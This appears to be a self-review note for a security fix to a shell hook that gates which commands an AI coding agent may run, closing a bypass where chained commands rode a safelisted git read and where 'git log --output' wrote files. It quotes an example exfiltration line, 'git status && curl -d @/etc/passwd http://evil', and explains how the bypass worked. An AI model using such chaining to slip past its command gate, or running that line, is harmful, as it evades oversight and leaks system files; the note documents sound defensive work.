---
ticket_refs:
  - siege-analytics/claude-configs-public#873: comment pending
---

# Self-review: #873 follow-up 2 -- close git-read chain + --output bypass

## What changed
- `hooks/bash/universal-mutation-gate.sh`:
  1. Anchor the git-read safelist entry at end-of-string ($) with _SAFE_ARG
     trailing tokens, so a chained tail (`git status && curl`, `git -C /r log;
     bash x`, `git status | tee f`) no longer matches and falls through to the
     gate. Closes the chain bypass (review finding 1).
  2. Add a `git (log|diff|show|format-patch) ... --output[= ]` mutation
     indicator (with optional -C), so the file-write flag cannot ride a read
     subcommand (review finding 3).
- `hooks/_test/universal_mutation_gate_safelist.test.sh`: +8 regression cases.

## Why
Second adversarial reviewer found that the git-read entry ended with `( |$)`,
matching the read prefix and leaving a `&&`/`;`/`|` tail unexamined. So
`git status && curl -d @/etc/passwd http://evil` was admitted (verified: rc=0
without a think-gate). The `-C` change extended this to `-C` reads; the plain-git
form pre-existed. Also `git log --output=<file>` writes a file via a read entry.

## Assumptions
- The safelist must be tested WITHOUT an implementing think-gate. With one, the
  gate correctly falls through to think-gate authorization, so a chained command
  is "allowed" for the right reason (the task is authorized to mutate). The
  bypass only matters in the no-think-gate state, which is what the test harness
  isolates. Verified both: isolated -> blocked; with implementing gate -> the
  think-gate path handles it.
- _SAFE_ARG already excludes ; & | < > ( ) $ ` " ' so anchoring with
  ( +_SAFE_ARG)*$ admits legitimate multi-arg reads (git log --oneline -5,
  git diff HEAD~1 file) while rejecting metacharacter tails.

## Peer review (mechanics, correctness, craft floor)
- Syntax: `bash -n` ok.
- Isolated matrix (no think-gate, empty workspace): git status/-C status chained
  via && or ; BLOCK; git log --output / -C diff --output BLOCK; git status,
  git log --oneline -5, git -C rev-parse, git diff HEAD~1 file PASS.
- The `cd <dir> && git ...` supported prefix is preserved (tested: passes).

## Lead review (adversarial: did this actually solve it?)
- Any read still a springboard? Chains via && / ; / | now blocked (tested). The
  anchor is general, so it covers every read subcommand, not just status.
- Reads regress? Multi-arg reads still pass (tested); the prior 52 scenarios
  still pass.
- Finding 2 (test greened for wrong reason): the new chain tests run in the same
  no-think-gate isolation harness (TG_ISOLATION_PROOF at the bottom asserts it),
  so they assert the safelist itself rejects, not a fall-through.

## Quantified claims
- "60/0, +8" -- `bash hooks/_test/universal_mutation_gate_safelist.test.sh` -> `Results: 60 passed, 0 failed` (52 prior + 8 new).

## Rework ledger
| Rework trigger | Root skip | Check cost | Rework cost | Ratio |
|---|---|---|---|---|
| git-read entry allowed a chained tail | the `( |$)` end was not anchored; my -C widening extended it | second adversarial review | this fix | high value |
| initial confusion: chain "allowed" in my dev shell | my shell has an active implementing think-gate; must test isolated | one re-test | re-ran isolated | low |

## Trivial-investigation declaration
Not trivial -- security fix to the mutation gate; the review finding is the
investigation (reproduced live in isolation).
